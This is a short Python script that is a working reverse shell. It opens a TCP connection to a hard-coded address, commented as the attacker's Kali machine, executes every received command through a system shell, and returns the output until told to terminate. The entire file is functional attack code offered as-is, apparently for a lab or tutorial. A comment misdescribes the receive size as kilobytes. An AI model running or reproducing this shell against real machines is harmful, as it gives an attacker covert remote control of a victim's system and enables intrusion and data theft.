import socket                     # For starting TCP connection
import subprocess                 # To start the shell in the system

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        # Creating object S 
    s.connect(('192.168.0.118', 8080))                            # attackers ( kali system ) IP address and port.
    while True:                                                 # Waiting for commands
        command =  s.recv(1024)                                 # read the first 1024 KB of the tcp socket
        if 'terminate' in command:                  # Terminate - Break
            s.close()
            break 
        
        else:                                      # else pass command to shell.
            
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( CMD.stdout.read()  ) # send back the result
            s.send( CMD.stderr.read()  ) # send back the error -if any-, such as syntax error

def main ():
    connect()
main()